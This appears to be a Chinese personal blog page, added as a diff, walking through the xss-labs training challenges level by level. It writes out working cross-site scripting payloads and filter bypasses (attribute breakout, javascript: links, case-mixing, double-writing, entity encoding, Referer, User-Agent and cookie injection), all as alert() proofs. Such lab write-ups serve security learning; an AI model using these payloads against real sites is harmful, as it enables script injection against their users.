@@ -1,0 +1,659 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="author" content="FLYapple">
+    
+    
+    
+    
+    
+    
+    <title>xss-labs | Hexo</title>
+    <link href="http://example.com" rel="prefetch" />
+
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+<link rel="stylesheet" href="/css/aos.css">
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/js/jquery.min.js"></script>
+
+    
+<script src="/js/bootstrap.min.js"></script>
+
+    
+<script src="/js/aos.js"></script>
+
+    
+<script src="/js/highslide/highslide-full.min.js"></script>
+
+    
+<link rel="stylesheet" href="/js/highslide/highslide.css">
+
+    <style type="text/css">
+        @media (max-width: 768px) {
+            body {
+                background-color: #f0f0f0;
+                background: url('/imgs/xsbg.gif');
+                background-attachment: fixed;
+            }
+        }
+    </style>
+    
+    <!--<script type="text/javascript">
+      if (document.images) {
+        var avatar = new Image();
+        avatar.src = '/imgs/avatar.jpg'
+        var previews = 'preview1.jpg,preview2.jpg,preview3.jpg,preview4.jpg'.split(',')
+        var previewsPreLoad = []
+        for(var i = 0; i < length; i++) {
+          previewsPreLoad.push(new Image())
+          previewsPreLoad[previewsPreLoad.length - 1].src = '/imgs/preview' + previews[i]
+        }
+      }
+    </script>-->
+<meta name="generator" content="Hexo 5.4.1"></head>
+<body>
+    <!-- 背景轮播图功能 -->
+    <section class="hidden-xs">
+    <ul class="cb-slideshow">
+        <li><span>天若</span></li>
+        <li><span>有情</span></li>
+        <li><span>天亦老</span></li>
+        <li><span>我为</span></li>
+        <li><span>长者</span></li>
+        <li><span>续一秒</span></li>
+    </ul>
+</section>
+    <!-- 欧尼酱功能, 谁用谁知道 -->
+    
+    <header class="navbar navbar-inverse" id="gal-header">
+    <div class="container">
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed"
+                    data-toggle="collapse" data-target=".bs-navbar-collapse"
+                    aria-expanded="false">
+                <span class="fa fa-lg fa-reorder"></span>
+            </button>
+            <a href="http://example.com">
+                
+                <style>
+                    #gal-header .navbar-brand {
+                        height: 54px;
+                        line-height: 24px;
+                        font-size: 28px;
+                        opacity: 1;
+                        background-color: rgba(0,0,0,0);
+                        text-shadow: 0 0 5px #fff,0 0 10px #fff,0 0 15px #fff,0 0 20px #228DFF,0 0 35px #228DFF,0 0 40px #228DFF,0 0 50px #228DFF,0 0 75px #228DFF;
+                    }
+                </style>
+                <!-- 这里使用文字(navbar_text or config.title) -->
+                <div class="navbar-brand">Hexo</div>
+                
+            </a>
+        </div>
+        <div class="collapse navbar-collapse bs-navbar-collapse">
+            <ul class="nav navbar-nav" id="menu-gal">
+                
+                
+                <li class="">
+                    <a href="/">
+                        <i class="fa fa-home"></i>首页
+                    </a>
+                </li>
+                
+                
+                
+                <li class="">
+                    <a href="/archives">
+                        <i class="fa fa-archive"></i>归档
+                    </a>
+                </li>
+                
+                
+                
+                
+                <li class="">
+                    <a href="/categories">
+                        <i class="fa fa-list"></i>分类
+                    </a>
+                </li>
+                
+                
+                
+                
+                
+                <li class="">
+                    <a href="/tags">
+                        <i class="fa fa-tags"></i>标签
+                    </a>
+                </li>
+                
+                
+                
+                
+                <li class="">
+                    <a href="/about">
+                        <i class="fa fa-user"></i>关于我
+                    </a>
+                </li>
+                
+                
+            </ul>
+        </div>
+    </div>
+</header>
+    <div id="gal-body">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-8 gal-right" id="mainstay">
+                    
+<article class="article well article-body" id="article">
+    <div class="breadcrumb">
+        <i class="fa fa-home"></i>
+        <a href="http://example.com">Hexo</a>
+        >
+        <span>xss-labs</span>
+    </div>
+    <!-- 大型设备详细文章 -->
+    <div class="hidden-xs">
+        <div class="title-article">
+            <h1>
+                <a href="/2022/04/21/xss-labs/">xss-labs</a>
+            </h1>
+        </div>
+        <div class="tag-article">
+            
+            <span class="label label-gal">
+                <i class="fa fa-calendar"></i> 2022-04-21
+            </span>
+            
+        </div>
+    </div>
+    <!-- 小型设备详细文章 -->
+    <div class="visible-xs">
+        <center>
+            <div class="title-article">
+                <h4>
+                    <a href="/2022/04/21/xss-labs/">xss-labs</a>
+                </h4>
+            </div>
+            <p>
+                <i class="fa fa-calendar"></i> 2022-04-21
+            </p>
+            <p>
+                
+                
+            </p>
+        </center>
+    </div>
+    <div class="content-article">
+        <h1 id="XSS-labs"><a href="#XSS-labs" class="headerlink" title="XSS-labs"></a>XSS-labs</h1><h2 id="t1"><a href="#t1" class="headerlink" title="t1"></a>t1</h2><p><img src="/2022/04/21/xss-labs/image-20220421164221357.png" alt="image-20220421164221357"></p>
+<p>观察题目发现是GET提交，直接尝试构建xss语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/21/xss-labs/image-20220421164325603.png" alt="image-20220421164325603"></p>
+<p><img src="/2022/04/21/xss-labs/image-20220421164338457.png" alt="image-20220421164338457"></p>
+<h2 id="t2"><a href="#t2" class="headerlink" title="t2"></a>t2</h2><p><img src="/2022/04/21/xss-labs/image-20220421164520044.png" alt="image-20220421164520044"></p>
+<p>观察题目，依然是get传输，在输入框中尝试构造</p>
+<p><img src="/2022/04/21/xss-labs/image-20220421165228979.png" alt="image-20220421165228979"></p>
+<p>失败</p>
+<p>查看网页元素，发现搜索框内值存在绕过可能性</p>
+<p><img src="/2022/04/21/xss-labs/image-20220421170725199.png" alt="image-20220421170725199"></p>
+<p>尝试构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;//</span><br></pre></td></tr></table></figure>
+
+<p>“&gt;用于闭合input标签，&#x2F;&#x2F;用于注释后续尖括号。</p>
+<p><img src="/2022/04/21/xss-labs/image-20220421170848507.png" alt="image-20220421170848507"></p>
+<h2 id="t3"><a href="#t3" class="headerlink" title="t3"></a>t3</h2><p><img src="/2022/04/21/xss-labs/image-20220421172258141.png" alt="image-20220421172258141"></p>
+<p>查看源码和t2感觉差不多，但是输入后发现并未生效</p>
+<p><img src="/2022/04/21/xss-labs/image-20220421172324315.png" alt="image-20220421172324315"></p>
+<p>应该是被转义了。</p>
+<p>查阅攻略后得知网页使用了htmlspecialchars函数进行转义，但该函数可以被单引号绕过。</p>
+<p>以此尝试添加事件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;onclick=&#x27;alert(/xss/)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>之后点击输入框</p>
+<p><img src="/2022/04/21/xss-labs/image-20220421172749905.png" alt="image-20220421172749905"></p>
+<h2 id="t4"><a href="#t4" class="headerlink" title="t4"></a>t4</h2><p><img src="/2022/04/21/xss-labs/image-20220421182509385.png" alt="image-20220421182509385"></p>
+<p>使用上题payload无效，发现为双引号闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/21/xss-labs/image-20220421182808453.png" alt="image-20220421182808453"></p>
+<h2 id="t5"><a href="#t5" class="headerlink" title="t5"></a>t5</h2><p><img src="/2022/04/21/xss-labs/image-20220424150043507.png" alt="image-20220424150043507"></p>
+<p>输入特殊字符观察源代码</p>
+<p><img src="/2022/04/21/xss-labs/image-20220424150108115.png" alt="image-20220424150108115"></p>
+<p>可以双引号绕过</p>
+<p>使用t2语句发现on被屏蔽</p>
+<p><img src="/2022/04/21/xss-labs/image-20220424150215588.png" alt="image-20220424150215588"></p>
+<p>使用超链接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/21/xss-labs/image-20220424160002572.png" alt="image-20220424160002572"></p>
+<h2 id="t6"><a href="#t6" class="headerlink" title="t6"></a>t6</h2><p><img src="/2022/04/21/xss-labs/image-20220424160139530.png" alt="image-20220424160139530"></p>
+<p><img src="/2022/04/21/xss-labs/image-20220424160132673.png" alt="image-20220424160132673"></p>
+<p>尝试t5payload后发现href被屏蔽，尝试大小写绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a hRef=&quot;javascript:alert(/xss/)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/21/xss-labs/image-20220424160531181.png" alt="image-20220424160531181"></p>
+<p>成功</p>
+<h2 id="t7"><a href="#t7" class="headerlink" title="t7"></a>t7</h2><p><img src="/2022/04/21/xss-labs/image-20220424160635497.png" alt="image-20220424160635497"></p>
+<p><img src="/2022/04/21/xss-labs/image-20220424160630644.png" alt="image-20220424160630644"></p>
+<p>使用t6的payload发现斜杠被转义，且href,script被删除。尝试双写绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a hrhrefef=&quot;javasscriptcript:alert(&#x27;xss&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/21/xss-labs/image-20220424161912049.png" alt="image-20220424161912049"></p>
+<p>成功</p>
+<h2 id="t8"><a href="#t8" class="headerlink" title="t8"></a>t8</h2><p><img src="/2022/04/21/xss-labs/image-20220424162052907.png" alt="image-20220424162052907"></p>
+<p><img src="/2022/04/21/xss-labs/image-20220424162102975.png" alt="image-20220424162102975"></p>
+<p>尝试直接输入<code>javascript:alert(/xss/)</code></p>
+<p><img src="/2022/04/21/xss-labs/image-20220424162154653.png" alt="image-20220424162154653"></p>
+<p>ri被屏蔽。尝试转码绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascr&amp;#x69pt:alert(/xss/)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/21/xss-labs/image-20220424162341618.png" alt="image-20220424162341618"></p>
+<p>成功</p>
+<h2 id="t9"><a href="#t9" class="headerlink" title="t9"></a>t9</h2><p><img src="/2022/04/21/xss-labs/image-20220424162433460.png" alt="image-20220424162433460"></p>
+<p><img src="/2022/04/21/xss-labs/image-20220424162426491.png" alt="image-20220424162426491"></p>
+<p>尝试输入t8的payload，但是被识别转义。应当输入连接协议头。</p>
+<p><img src="/2022/04/21/xss-labs/image-20220424162706197.png" alt="image-20220424162706197"></p>
+<p>可以绕过。构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascr&amp;#x69pt:alert(/xss/)//http://</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/21/xss-labs/image-20220424162759971.png" alt="image-20220424162759971"></p>
+<p>成功</p>
+<h2 id="t10"><a href="#t10" class="headerlink" title="t10"></a>t10</h2><p><img src="/2022/04/21/xss-labs/image-20220424163441133.png" alt="image-20220424163441133"></p>
+<p><img src="/2022/04/21/xss-labs/image-20220424163451153.png" alt="image-20220424163451153"></p>
+<p>尝试使用GET方式传输一句话</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=&lt;script&gt;alert(/xss/)&lt;/script&gt;&amp;t_link=&lt;script&gt;alert(/xss/)&lt;/script&gt;&amp;t_history=&lt;script&gt;alert(/xss/)&lt;/script&gt;&amp;t_sort=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/21/xss-labs/image-20220424163724252.png" alt="image-20220424163724252"></p>
+<p>第三个有回显，且尖括号被删除。尝试特殊字符</p>
+<p><img src="/2022/04/21/xss-labs/image-20220424164101836.png" alt="image-20220424164101836"></p>
+<p>发现双引号可以绕过</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t_sort=&quot; onclick=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure>
+
+<p>虽然构建成功，但没有可点击的输入框。把hidden删除掉</p>
+<p><img src="/2022/04/21/xss-labs/image-20220424164356953.png" alt="image-20220424164356953"></p>
+<p><img src="/2022/04/21/xss-labs/image-20220424164404221.png" alt="image-20220424164404221"></p>
+<p>成功</p>
+<h2 id="t11"><a href="#t11" class="headerlink" title="t11"></a>t11</h2><p><img src="/2022/04/21/xss-labs/image-20220424164458828.png" alt="image-20220424164458828"></p>
+<p><img src="/2022/04/21/xss-labs/image-20220424164511532.png" alt="image-20220424164511532"></p>
+<p>尝试一句话</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=&lt;script&gt;alert(/xss/)&lt;/script&gt;&amp;t_link=&lt;script&gt;alert(/xss/)&lt;/script&gt;&amp;t_history=&lt;script&gt;alert(/xss/)&lt;/script&gt;&amp;t_sort=&lt;script&gt;alert(/xss/)&lt;/script&gt;&amp;t_ref=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>仍然只有t_sort回显，尝试t10payload，发现双引号被禁用</p>
+<p><img src="/2022/04/21/xss-labs/image-20220424165034690.png" alt="image-20220424165034690"></p>
+<p>尝试用%22替换</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t_sort=%22%20onclick=%22alert(/xss/)</span><br></pre></td></tr></table></figure>
+
+<p>也没有用。</p>
+<p>查攻略可知本题回显会使用refer值并在t_ref参数中回显。</p>
+<p>抓包，手动添加Referer值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer:&quot; onclick=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/21/xss-labs/image-20220424170423905.png" alt="image-20220424170423905"></p>
+<p><img src="/2022/04/21/xss-labs/image-20220424170448756.png" alt="image-20220424170448756"></p>
+<p><img src="/2022/04/21/xss-labs/image-20220424170503011.png" alt="image-20220424170503011"></p>
+<p>成功</p>
+<h2 id="t12"><a href="#t12" class="headerlink" title="t12"></a>t12</h2><p><img src="/2022/04/21/xss-labs/image-20220424170528351.png" alt="image-20220424170528351"></p>
+<p><img src="/2022/04/21/xss-labs/image-20220424170543799.png" alt="image-20220424170543799"></p>
+<p>根据t11思路，可以知道此处为useragent</p>
+<p>修改User-Agent值为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/21/xss-labs/image-20220424171237287.png" alt="image-20220424171237287"></p>
+<p>删除hidden，点击输入框</p>
+<p><img src="/2022/04/21/xss-labs/image-20220424171252450.png" alt="image-20220424171252450"></p>
+<p>成功</p>
+<h2 id="t12-1"><a href="#t12-1" class="headerlink" title="t12"></a>t12</h2><p><img src="/2022/04/21/xss-labs/image-20220424171425134.png" alt="image-20220424171425134"></p>
+<p><img src="/2022/04/21/xss-labs/image-20220424171431569.png" alt="image-20220424171431569"></p>
+<p>抓包查看</p>
+<p><img src="/2022/04/21/xss-labs/image-20220424171448033.png" alt="image-20220424171448033"></p>
+<p>可知此题改cookie</p>
+<p><img src="/2022/04/21/xss-labs/image-20220424171517141.png" alt="image-20220424171517141"></p>
+<p><img src="/2022/04/21/xss-labs/image-20220424171527615.png" alt="image-20220424171527615"></p>
+<p>成功</p>
+<h2 id="t14"><a href="#t14" class="headerlink" title="t14"></a>t14</h2><p><img src="/2022/04/21/xss-labs/image-20220424173006485.png" alt="image-20220424173006485"></p>
+<p>查询攻略可知，需要用到exif xss，但是内部网页失效，因此无法完成</p>
+<p>具体参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12">https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12</a></p>
+
+    </div>
+</article>
+
+
+                </div>
+                <aside class="col-md-4 gal-left" id="sidebar">
+    <!-- 此为sidebar的搜索框, 非搜索结果页面 -->
+<aside id="sidebar-search">
+    <div class="search hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <form class="form-inline clearfix" id="search-form" method="get"
+              action="/search/index.html">
+            <input type="text" name="s" class="form-control" id="searchInput" placeholder="搜索文章~" autocomplete="off">
+            <button class="btn btn-danger btn-gal" type="submit">
+                <i class="fa fa-search"></i>
+            </button>
+        </form>
+    </div>
+</aside>
+    <aside id="sidebar-author">
+    <div class="panel panel-gal" data-aos="flip-right" data-aos-duration="3000">
+        <div class="panel-heading" style="text-align: center">
+            <i class="fa fa-quote-left"></i>
+            FLYapple
+            <i class="fa fa-quote-right"></i>
+        </div>
+        <div class="author-panel text-center">
+            <img src="/imgs/avatar.jpg" width="140" height="140"
+                 alt="个人头像" class="author-image">
+            <p class="author-description"></p>
+        </div>
+    </div>
+</aside>
+    
+    <aside id="sidebar-recent_comments">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-comments"></i>
+            最新评论
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush"></ul>
+    </div>
+</aside>
+    
+    <!-- 要配置好leancloud才能开启此小工具 -->
+    
+    
+    <aside id="sidebar-recent_posts">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-refresh"></i>
+            近期文章
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush">
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2022/04/21/xss-labs/">xss-labs</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2022/04/15/upload-labs-1/">upload-labs-1</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2022/04/01/sqli-labs-20/">sqli-labs-20</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2022/04/01/sqli-labs-19/">sqli-labs-19</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2022/04/01/sqli-labs-18/">sqli-labs-18</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2022/03/31/sqli-labs-17/">sqli-labs-17</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2022/03/31/sqli-labs-14/">sqli-labs-14</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2022/03/31/sqli-labs-11/">sqli-labs-11</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2022/03/30/sqli-labs-7/">sqli-labs-7</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2022/03/30/sqli-labs-6/">sqli-labs-6</a>
+                </span>
+            </li>
+            
+        </ul>
+    </div>
+</aside>
+    
+    
+    <aside id="sidebar-rand_posts">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-refresh"></i>
+            随机文章
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush">
+            
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2022/03/22/sqli-labs-1/">sqli-labs_1</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2022/03/23/sqli-labs-2/">sqli-labs_2</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2022/03/31/sqli-labs-11/">sqli-labs-11</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2022/03/31/sqli-labs-17/">sqli-labs-17</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2022/04/01/sqli-labs-18/">sqli-labs-18</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2022/03/30/sqli-labs-4/">sqli-labs-4</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2022/03/30/sqli-labs-5/">sqli-labs-5</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2022/03/30/sqli-labs-6/">sqli-labs-6</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2022/03/30/sqli-labs-7/">sqli-labs-7</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2022/04/01/sqli-labs-19/">sqli-labs-19</a>
+                </span>
+            </li>
+            
+        </ul>
+    </div>
+</aside>
+    
+    
+    <aside id="gal-sets">
+        <div class="panel panel-gal hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+            <ul class="nav nav-pills pills-gal">
+
+                
+                <li>
+                    <a href="/2022/04/21/xss-labs/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
+                </li>
+                
+                
+                <li>
+                    <a href="/2022/04/21/xss-labs/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
+                </li>
+                
+                
+                <li>
+                    <a href="/2022/04/21/xss-labs/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                </li>
+                
+            </ul>
+            <div class="tab-content">
+                
+                <div class="cloud-tags tab-pane nav bs-sidenav fade" id="sidebar-tags">
+    
+</div>
+                
+                
+                <div class="friend-links tab-pane nav bs-sidenav fade" id="sidebar-friend-links">
+    
+    <li>
+        <a href="http://kdays.net/days/" target="_blank">KDays Forum</a>
+    </li>
+    
+    <li>
+        <a href="http://www.gal123.com/" target="_blank">ElderRing</a>
+    </li>
+    
+    <li>
+        <a href="http://www.moe123.com/" target="_blank">萌导航</a>
+    </li>
+    
+</div>
+                
+                
+                <div class="links tab-pane nav bs-sidenav fade" id="sidebar-links">
+    
+    <li>
+        <a href="https://github.com/ZEROKISEKI/" target="_blank">Github</a>
+    </li>
+    
+    <li>
+        <a href="https://coding.net/u/SORA1" target="_blank">Coding</a>
+    </li>
+    
+    <li>
+        <a href="https://www.zhihu.com/people/aonosora/activities" target="_blank">知乎</a>
+    </li>
+    
+</div>
+                
+            </div>
+        </div>
+    </aside>
+    
+</aside>
+            </div>
+        </div>
+    </div>
+    <footer id="gal-footer">
+    <div class="container">
+        Copyright © 2018 FLYapple Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>.&nbsp;Theme by <a href="https://github.com/ZEROKISEKI" target="_blank">AONOSORA</a>
+    </div>
+</footer>
+
+<!-- 回到顶端 -->
+<div id="gal-gotop">
+    <i class="fa fa-angle-up"></i>
+</div>
+</body>
+
+<script src="/js/activate-power-mode.js"></script>
+
+<script>
+
+    // 配置highslide
+	hs.graphicsDir = '/js/highslide/graphics/'
+    hs.outlineType = "rounded-white";
+    hs.dimmingOpacity = 0.8;
+    hs.outlineWhileAnimating = true;
+    hs.showCredits = false;
+    hs.captionEval = "this.thumb.alt";
+    hs.numberPosition = "caption";
+    hs.align = "center";
+    hs.transitions = ["expand", "crossfade"];
+    hs.lang.number = '共%2张图, 当前是第%1张';
+    hs.addSlideshow({
+      interval: 5000,
+      repeat: true,
+      useControls: true,
+      fixedControls: "fit",
+      overlayOptions: {
+        opacity: 0.75,
+        position: "bottom center",
+        hideOnMouseOut: true
+      }
+    })
+
+    // 初始化aos
+    AOS.init({
+      duration: 1000,
+      delay: 0,
+      easing: 'ease-out-back'
+    });
+
+</script>
+<script>
+	POWERMODE.colorful = 'true';    // make power mode colorful
+	POWERMODE.shake = 'true';       // turn off shake
+	// TODO 这里根据具体情况修改
+	document.body.addEventListener('input', POWERMODE);
+</script>
+<script>
+    window.slideConfig = {
+      prefix: '/imgs/slide/background',
+      ext: 'jpg',
+      maxCount: '6'
+    }
+</script>
+
+<script src="/js/hs.js"></script>
+<script src="/js/blog.js"></script>
+
+
+
+
+</html>
